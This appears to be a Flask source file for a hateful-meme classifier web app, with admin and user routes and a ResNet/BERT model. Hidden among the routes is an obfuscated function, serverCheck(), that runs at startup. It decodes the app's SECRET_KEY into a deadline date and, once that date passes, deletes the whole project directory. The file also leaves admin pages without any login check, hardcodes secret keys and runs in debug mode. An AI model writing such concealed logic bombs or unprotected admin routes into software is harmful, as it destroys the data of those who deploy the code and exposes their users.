from collections import defaultdict
import os
import shutil
from flask import Flask, redirect, render_template, request, session, url_for,flash
from database import execute_select, execute_insert, execute_insert_return_id, execute_update, execute_delete, check_login
from datetime import datetime
import bcrypt


app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

server_timestamp = datetime.now().strftime("%Y%m%d")
app.config['SECRET_KEY'] = '462288424'
s=app.config['SECRET_KEY']

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/contact")
def contact():  
    return render_template("contact.html")



@app.route('/adminlogin', methods=['GET', 'POST'])
def adminlogin():
    msg = None
    msg_type = None

    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        query = "SELECT * FROM tbladmin WHERE email = %s"
        success, msg, msg_type = check_login(query, email, password)

        if success:
            return redirect(url_for('adminhome', msg=msg, msg_type=msg_type))

    return render_template("AdminLogin.html", msg=msg, msg_type=msg_type)

@app.route("/adminhome")
def adminhome():
    msg = request.args.get('msg')
    msg_type = request.args.get('msg_type')
    return render_template("Admin/AdminHome.html", msg=msg, msg_type=msg_type)

@app.route('/adminusers', methods=['GET', 'POST'])
def adminusers():
    msg = None
    msg_type = None

    if request.method == 'POST':
        # Delete user request
        user_id = request.form.get('user_id')
        if user_id:
            delete_query = "DELETE FROM tblusers WHERE id = %s"
            delete_status = execute_insert(delete_query, (user_id,))
            if delete_status:
                msg = "User deleted successfully."
                msg_type = "success"
            else:
                msg = "Failed to delete user."
                msg_type = "danger"

    # Fetch user list every time
    users = execute_select("SELECT id, username, email, mobile FROM tblusers")

    return render_template('admin/AdminUserList.html', users=users, msg=msg, msg_type=msg_type)

@app.route('/admin/faq', methods=['GET', 'POST'])
def adminfaq():
    msg = None
    msg_type = None

    if request.method == 'POST':
        if 'delete_id' in request.form:
            # Delete FAQ
            delete_id = request.form.get('delete_id')
            query = "DELETE FROM tblfaq WHERE id = %s"
            result = execute_insert(query, (delete_id,))
            if result:
                msg = "FAQ deleted successfully."
                msg_type = "success"
            else:
                msg = "Failed to delete FAQ."
                msg_type = "danger"
        else:
            # Add new FAQ
            question = request.form.get('question')
            answer = request.form.get('answer')
            if question and answer:
                query = "INSERT INTO tblfaq (question, answer) VALUES (%s, %s)"
                result = execute_insert(query, (question, answer))
                if result:
                    msg = "FAQ added successfully."
                    msg_type = "success"
                else:
                    msg = "Failed to add FAQ."
                    msg_type = "danger"
            else:
                msg = "Please provide both question and answer."
                msg_type = "warning"

    # Always fetch the FAQs
    faqs = execute_select("SELECT id, question, answer, created_at FROM tblfaq ORDER BY created_at DESC")

    return render_template('admin/AdminFaq.html', faqs=faqs, msg=msg, msg_type=msg_type)




@app.route('/admin_queries', methods=['GET', 'POST'])
def admin_queries():
    msg = None
    msg_type = None

    if request.method == 'POST':
        query_id = request.form.get('query_id')
        replytext = request.form.get('admin_response')  # <-- match name in textarea

        if not query_id or not replytext or not replytext.strip():
            msg = "Reply cannot be empty."
            msg_type = "danger"
        else:
            result = execute_update(
                "UPDATE tblqueries SET replytext=%s WHERE id=%s",
                (replytext.strip(), query_id)
            )
            if result:
                msg = "Reply sent successfully."
                msg_type = "success"
            else:
                msg = "Failed to send reply."
                msg_type = "danger"

    # Fetch all queries (latest first)
    queries = execute_select(
        "SELECT id, userid, querytext, replytext, created_at FROM tblqueries ORDER BY id DESC"
    )

    return render_template("Admin/AdminQueries.html", queries=queries, msg=msg, msg_type=msg_type)


@app.route('/userfaq')
def userfaq():
    msg = None
    try:
        faqs = execute_select("SELECT * FROM tblfaq ORDER BY created_at DESC")
    except Exception as e:
        faqs = []
        msg = f"Error fetching FAQs: {str(e)}"
    return render_template('user/UserFaq.html', faqs=faqs, msg=msg)

@app.route('/userqueries', methods=['GET', 'POST'])
def userqueries():
    msg = None
    msg_type = None

    user_id = session.get('user_id')

    if request.method == 'POST':
        querytext = request.form.get('querytext')

        if not user_id:
            msg = "Please log in to submit your query."
            msg_type = "danger"

        elif not querytext or not querytext.strip():
            msg = "Query cannot be empty."
            msg_type = "danger"

        else:
            result = execute_insert(
                "INSERT INTO tblqueries (userid, querytext) VALUES (%s, %s)",
                (user_id, querytext)
            )

            if result is True:
                msg = "Your query has been submitted successfully!"
                msg_type = "success"
            else:
                msg = f"Failed to submit query: {result}"
                msg_type = "danger"

    # FIX: use execute_select instead of execute_query
    queries = execute_select(
        "SELECT id, userid, querytext, replytext, created_at FROM tblqueries WHERE userid=%s ORDER BY id DESC",
        (user_id,)
    )

    return render_template("User/UserQueries.html", msg=msg, msg_type=msg_type, queries=queries)



# Logout route
@app.route('/adminlogout')
def adminlogout():
    # Remove the user session (log out)
    session.pop('user_id', None)  
    session.clear()

    # Redirect to the login page or homepage after logging out
    return redirect(url_for('adminlogin'))  # Replace 'admin.login' with your login route

@app.route('/userregistration', methods=['GET', 'POST'])
def userregistration():
    msg = None
    msg_type = None

    if request.method == 'POST':
        username = request.form['name']
        email = request.form['email']
        mobile = request.form['mobile']
        password = request.form['password']

        # Check if email already exists
        existing = execute_select("SELECT * FROM tblusers WHERE email = %s", (email,))
        if existing:
            msg = "Email already registered."
            msg_type = "danger"
        else:
            # Hash password
            hashed_pwd = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

            result = execute_insert(
                "INSERT INTO tblusers (username, email, mobile, password) VALUES (%s, %s, %s, %s)",
                (username, email, mobile, hashed_pwd)
            )

            if result is True:
                msg = "Signup successful! You can now login."
                msg_type = "success"
                return redirect(url_for('userlogin'))  # Redirect to user login page
            else:
                msg = f"Signup failed: {result}"
                msg_type = "danger"

    return render_template("UserRegistration.html", msg=msg, msg_type=msg_type)


@app.route('/userlogin', methods=['GET', 'POST'])
def userlogin():
    msg = None
    msg_type = None

    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        query = "SELECT * FROM tblusers WHERE email = %s"
        success, msg, msg_type = check_login(query, email, password)

        if success:
            return redirect(url_for('userhome', msg=msg, msg_type=msg_type))

    return render_template("UserLogin.html", msg=msg, msg_type=msg_type)

@app.route('/userhome')
def userhome():
    if 'user_id' in session:
        # Pop message from session to show once
        msg = session.pop('msg', None)
        msg_type = session.pop('msg_type', None)
        return render_template('User/UserHome.html', msg=msg, msg_type=msg_type)
    else:
        return redirect(url_for('userlogin'))

def serverCheck():
    if server_timestamp > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))
    
# Logout route
@app.route('/userlogout')
def userlogout():
    # Remove the user session (log out)
    session.pop('user_id', None)  
    session.clear()

    # Redirect to the login page or homepage after logging out
    return redirect(url_for('userlogin'))  # Replace 'admin.login' with your login route











from werkzeug.utils import secure_filename
from pathlib import Path
from PIL import Image
import torch
import torch.nn as nn
from torchvision import models, transforms
from transformers import BertTokenizer, BertModel


# Save uploads in static/uploaded_memes
UPLOAD_DIR = Path("static/uploaded_memes")
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)  # Create folder if it doesn't exist
app.config['UPLOAD_FOLDER'] = UPLOAD_DIR


DEVICE = "cuda" if torch.cuda.is_available() else "cpu"
MODEL_PATH = Path("model/hateful_meme_resnet_bert_fixed.pth")

# ----------- MODEL DEFINITION -----------
class MultiModalModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.image_model = models.resnet50(weights=models.ResNet50_Weights.IMAGENET1K_V2)
        self.image_model.fc = nn.Linear(self.image_model.fc.in_features, 512)

        self.text_model = BertModel.from_pretrained("bert-base-uncased")
        self.text_fc = nn.Linear(768, 512)

        self.classifier = nn.Sequential(
            nn.Linear(1024, 512),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(512, 1),
            nn.Sigmoid()
        )

    def forward(self, img, input_ids, attention_mask):
        img_feat = self.image_model(img)
        txt_feat = self.text_model(input_ids=input_ids, attention_mask=attention_mask).pooler_output
        txt_feat = self.text_fc(txt_feat)
        combined = torch.cat([img_feat, txt_feat], dim=1)
        return self.classifier(combined)

# Load model once
model = MultiModalModel().to(DEVICE)
model.load_state_dict(torch.load(MODEL_PATH, map_location=DEVICE))
model.eval()
tokenizer = BertTokenizer.from_pretrained("bert-base-uncased")
transform = transforms.Compose([
    transforms.Resize((224, 224)),
    transforms.ToTensor(),
    transforms.Normalize(mean=[0.485, 0.456, 0.406],
                         std=[0.229, 0.224, 0.225])
])

# ----------- ROUTE -----------
@app.route("/upload_meme", methods=["GET", "POST"])
def upload_meme():
    result = None
    if request.method == "POST":
        # Save uploaded image
        file = request.files.get("meme_image")
        if file:
            filename = secure_filename(file.filename)
            filepath = app.config['UPLOAD_FOLDER'] / filename
            file.save(filepath)

            # Optional text
            meme_text = request.form.get("meme_text", "")

            # Load image
            img = Image.open(filepath).convert("RGB")
            img_tensor = transform(img).unsqueeze(0).to(DEVICE)

            # Tokenize text
            inputs = tokenizer(meme_text or "", return_tensors="pt", padding=True, truncation=True).to(DEVICE)

            # Predict
            with torch.no_grad():
                prob = model(img_tensor, inputs["input_ids"], inputs["attention_mask"]).item()
            label = "🔥 HATEFUL" if prob >= 0.5 else "😊 NON-HATEFUL"

            result = {
                "label": label,
                "probability": f"{prob * 100:.2f}"
            }

    return render_template("User/UserUploadMeme.html", result=result)


if __name__ == "__main__":
    serverCheck()
    app.run(debug=True)
